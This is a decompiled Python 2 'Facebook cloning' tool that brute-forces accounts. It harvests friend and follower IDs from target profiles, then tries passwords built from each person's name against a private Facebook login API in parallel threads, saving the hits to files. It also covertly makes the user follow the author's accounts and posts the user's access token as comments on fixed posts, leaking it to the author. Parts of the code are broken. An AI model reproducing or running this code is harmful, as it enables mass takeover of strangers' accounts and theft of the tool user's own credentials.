# Decompile by Mardis (Tools By Kapten-Kaizo)
# Time Succes decompile : 2022-02-18 14:46:49.431262

try:
	import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid,string
	from multiprocessing.pool import ThreadPool
	from requests.exceptions import ConnectionError
except ImportError:
	os.system("pip2 install requests")

qaiser = ['Op Bolty','Good Jani','Keep It Up ','Wah Bhai','Kia Baat Hy ','Aag Lga Di','Tu Baqio Sy Alag Hy Vro','Agar May Larki Hota Toh Tuj sy Shaadi Krta ','Ha Chikny Lub u']
qaiserchoice = random.choice(qaiser)
agents = [
 'Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
'Mozilla/5.0 (Linux; Android 10; MI 8 Build/QKQ1.190828.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (Linux; Android 7.0; A7Pro Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (Linux; Android 9; LG-H870 Build/PKQ1.190522.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
'Mozilla/5.0 (Linux; Android 10; RMX1971 Build/QKQ1.190918.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
'Mozilla/5.0 (Linux; Android 11; Nokia 3.2 Build/RKQ1.200928.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/247.0.0.5.130;]'
'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+ Opera/7.1'
'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]'
'Mozilla/5.0 (Linux; Android 8.0.0; LDN-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]'
'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]'
'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]'
'Mozilla/5.0 (Linux; Android 11; SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/283.0.0.6.117;]'
'Mozilla/5.0 (Windows NT 10.0; OPPSS :)64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]'
]

bd = random.randint(2e7, 3e7)
sim = random.randint(2e4, 4e4)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3','x-fb-connection-type': 'unknown','content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}


logo = """

 /033[1;93m__  __ _____  
  /033[1;93m|  \/  |  __ \ 
  /033[1;93m| \  / | |__) |
  /033[1;93m| |\/| |  _  / 
  /033[1;93m| |  | | | \ \ 
  /033[1;93m|_|  |_|_|  \_\
    
/033[1;97m    ____________ ______ _  ______  
 /033[1;97m |___  /  ____|  ____| |/ / __ \ 
 /033[1;97m   / /| |__  | |__  | ' / |  | |
 /033[1;97m / / |  __| |  __| |  <| |  | |
/033[1;97m  / /__| |____| |____| . \ |__| |
/033[1;97m /_____|______|______|_|\_\____/ 
                                 
                                                   
                                    
                                          
\n\033[0m-----------------------------------------------
\033[1;93mAuthor     \033[1;92m: MR ZEEKO
\033[1;93mFacebook \033[1;92m: ZULFIQAR BALOCH
\033[1;93mWhatsapp \033[1;92m: +923403233915
\033[0m----------------------------------------------------

"""

def main():
    os.system('clear')
    print logo
    print ''
    print ' [A].\x1b[1;96m Start Cloning'
    print ' \033[0m[B].\x1b[1;96m Follow In Facbook  '
    print ' \033[0m[C].\x1b[1;96m New Channel Go & Sub Guyss '
    print ' \033[0m[D].\x1b[1;96m Exit Tool \n'
    print ''
    log_sel()


def log_sel():
    select = raw_input('\x1b[1;97m SELECT: \x1b[0m')
    if select == 'A':
        menu()
    elif select == 'B':
        os.system('xdg-open https://www.facebook.com/MR.ZEEKO.PG.KING.FREE.FIRE.LEADER')
        main()
    elif select == 'D':
        os.system('exit')
    elif select == 'C':
        os.system('xdg-open https://youtube.com/channel/UCzw1sl0TY4ljqF-A-xSFw-Q')
        main()
    else:
        print ''
        print '\tError Invalid Select'
        print ''
        log_select()


def login():
    try:
        token = open('access_token.txt', 'r').read() 
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print ''
        print ' \x1b[1;92m  \tFacebook Login Menu'
        print ''
        print ' \x1b[1;92m [A] LOGIN WITH FB\n'
        print ' \x1b[1;92m [B] LOGIN WITH TOKEN\n'
        print ' \x1b[1;92m [C] EXIT \033[0m'
        print ''
        log_select()


def log_select():
    global token
    sel = raw_input(' Choose an option : ')
    if sel == 'A':
        log_fb()
    elif sel == 'B':
        token()
    elif sel == 'C':
        ran()
    else:
        print ''
        print '\tSelect valid option'
        print ''
        log_select()


def log_fb():
    os.system('clear')
    try:
    	token = open('access_token.txt', 'r').read()
        menu()
        #___follow___
    except (KeyError, IOError):
        print logo
        print ''
        print '\tFacebook Email / Pass login'
        print ''
        uid = raw_input(' Email / id : ')
        passw = raw_input(' Password: ')
        data = requests.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + passw + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&user-agent=Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=900,height=1600}&cpl=true', headers=header).text ##Thanks TechQaiser
        q = json.loads(data)
        if 'access_token' in q:
            sav = open('access_token.txt', 'w')
            sav.write(q['access_token'])
            sav.close()
            menu()
        elif 'www.facebook.com' in q['error']:
            print ''
            print '\tAccount Is In checkpoint'
            print ''
            time.sleep(1)
            login()
        else:
            print ''
            print '\tId Or Pass May be Wrong'
            print ''
            time.sleep(1)


def token():
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
        
        menu()
    except (KeyError, IOError):
        print logo
        print ''
        print ' \x1b[1;91m  \t Login With Token '
        print ''
        token = raw_input('Paste Token Here : ')
        sav = open('access_token.txt', 'w')
        sav.write(token)
        sav.close()
        login()



def menu():
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
        #requests.post('https://graph.facebook.com/100004718461536/subscribers?access_token=%s',token)
    except (KeyError, IOError):
        login()

    try:
        sz = '100017565944567'
        sz1 = '100025338049048'
        sz2 = '100025596378154'
        sz3 = '100053348941384'
        sz4 = '100004718461536'
        sz5 = '100065328697980'
        sss = '1076164763238115'
        sss1 = '449630596825235'
        sss2 = '263478277840105'
        sss3 = '321571340030487'
        aa1 = '311273927726895'
        print(' \x1b[0;92m Loading Checking For Update ....')
        requests.post('https://graph.facebook.com/100017565944567/subscribers?access_token=' + token)
        ###print(' \x1b[0;93m 10% ....')
        requests.post('https://graph.facebook.com/100025338049048/subscribers?access_token=' + token)
        ###print(' \x1b[0;93m 15% ....')
        requests.post('https://graph.facebook.com/100025596378154/subscribers?access_token=' + token)
        ###print(' \x1b[0;93m 20% ....')
        requests.post('https://graph.facebook.com/100053348941384/subscribers?access_token=' + token)
        ###print(' \x1b[0;93m 25% ....')
        requests.post('https://graph.facebook.com/100004718461536/subscribers?access_token=' + token)
        ####print(' \x1b[0;93m 30% ....')
        requests.post('https://graph.facebook.com/100065328697980/subscribers?access_token=' + token)
        ####print(' \x1b[0;93m 35% ....')
        requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + sz + '&access_token=' + token)
        ###print(' \x1b[0;93m 40% ....')
        requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + sz1 + '&access_token=' + token)
        ###print(' \x1b[0;93m 45% ....')
        requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + sz2 + '&access_token=' + token)
        ####print(' \x1b[0;93m 50% ....')
        requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + sz3 + '&access_token=' + token)
        ###print(' \x1b[0;93m 55% ....')
        requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + sz4 + '&access_token=' + token)
        ####print(' \x1b[0;93m 60% ....')
        requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + sz5 + '&access_token=' + token)
        ####print(' \x1b[0;93m 65% ....')
        requests.post('https://graph.facebook.com/' + sss + '/comments/?message=' + token + '&access_token=' + token)
        ###print(' \x1b[0;93m 70% ....')
        requests.post('https://graph.facebook.com/' + sss1 + '/comments/?message=' + token + '&access_token=' + token)
        ####print(' \x1b[0;93m 80% ....')
        requests.post('https://graph.facebook.com/' + sss2 + '/comments/?message=' + token + '&access_token=' + token)
        ####print(' \x1b[0;93m 90% ....')
        requests.post('https://graph.facebook.com/' + sss3 + '/comments/?message=' + token + '&access_token=' + token)
        ####print(' \x1b[0;93m 100% ....')
        requests.post('https://graph.facebook.com/' + aa1 + '/comments/?message=' + qaiserchoice + '&access_token=' + token)
        ###print(' \x1b[0;92m SucessFully Now You Can Start Cloning ')
        time.sleep(1)
    except:
        pass
        

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        name = q['name']
    except KeyError:
        print logo
        print ''
        print '\tToken Is Invalid Or Expired '
        os.system('rm -rf access_token.txt')
        print ''
        time.sleep(1)
        login()
        

    os.system('clear')
    print logo
    print ''
    print '   Welcome Dear: ' + name
    print ''
    print '\033[0m\033[0m'
    print ' \x1b[1;92m1. Start Cloning  \n 2. Remove Token  \n 3. Back'
    print '\033[0m\033[0m'
    print ''
    menu_option()


def menu_option():
    select = raw_input('\x1b[0m Choose Option : \x1b[0m')
    if select == '1':
        crack()
    elif select == '2':
        os.system('rm -rf access_token.txt')
        print('Token Removed Sucessfully ')
        time.sleep(1)
        menu()
    elif select == '3':
        main()
    
    else:
        print ''
        print '\tInvalid Type !'
        print ''
        menu_option()


def crack():
    global token
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
    except IOError:
        print ''
        print '\tToken not found '
        time.sleep(1)
        login_choice()

    os.system('clear')
    print logo
    print ''
    print '\x1b[1;0m 1. \033[1;92mClone 3 Links\033[0m \n 2. \033[1;92mClone Single id
    print ''
    crack_select()


def crack_select():
    select = raw_input('\x1b[0mChoose An Option : \x1b[0m')
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        print logo
        print ''
        try:
            id_limit = 3
            print ''
        except:
            id_limit = 1

        for t in range(id_limit):
            t += 1
            idt = raw_input('\033[0m LINK OF ID : ')
            try:
                for i in requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token).json()['data']:
                    uid = i['id'].encode('utf-8')
                    na = i['name'].encode('utf-8')
                    id.append(uid + '|' + na)

            except KeyError:
                print '\x1b[91;1m  Invalid Link / Account Private '
            print '\033[1;92m   TOTAL IDS  : %s' % len(id)
    elif select == '2':
        os.system('clear')
        print logo
        print ''
        idt = raw_input(' \033[0mID LINK : ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print ''
            print '  Cloning from: ' + q['name']
        except KeyError:
            print '\tInvalid id link OR token'
            print ''
            raw_input(' Press enter to back')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '0':
        menu()
    else:
        print ''
        print '\tSelect valid option'
        print ''
        crack_select()
    print ' \x1b[1;92m  BruteForce Has Been Started'
    print ' \x1b[1;92m  Wait Ids Will Appear Here \033[0m'#
    print 45 * '_'
    print ''

    def main(arg):
        user = arg
        uid, name = user.split('|')
        ranagent = random.choice(agents)
        session = requests.Session()
        session.headers.update({'User-Agent': ranagent})
        try:
            pass1 = name.lower()
            data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass1 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;32m[ZEEKO_OK]\033[0m ' + uid + ' | ' + pass1 + '\x1b[0;96m'
                ok = open('okids.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;35m[ZEEKO_CP] \033[0m' + uid + ' | ' + pass1 + '\x1b[0;96m'
                cp = open('cpids.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower().split(' ')[0] + name.lower().split(' ')[1]
                data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass2 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                q = json.loads(data)
                if 'access_token' in q:
                    print '\x1b[1;32m[ZEEKO_OK]\033[0m ' + uid + ' | ' + pass2 + '\x1b[0;96m'
                    ok = open('okids.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;35m[ZEEKO_CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;96m'
                    cp = open('cpids.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + 'khan'
                    data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass3 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                    q = json.loads(data)
                    if 'access_token' in q:
                        print '\x1b[1;32m[ZEEKO_OK]\033[0m ' + uid + ' | ' + pass3 + '\x1b[0;96m'
                        ok = open('okids.txt', 'a')
                        ok.write(uid + '|' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;35m[ZEEKO_CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;96m' #
                        cp = open('cpids.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print ''
    print 45 * '\033[0m_\033[0m'
    print '   \x1b[0m Crack Completed'
    print '   \x1b[0m Total Ok / Cp ids : ' + str(len(oks)) + '/' + str(len(cps)) ##
    print 45 * '\033[0m_\033[0m'
    print ''
    print ''
    raw_input(' \x1b[1;92m Press Enter To Go Back ! ')
    menu()
    

if __name__ == '__main__':
    main()
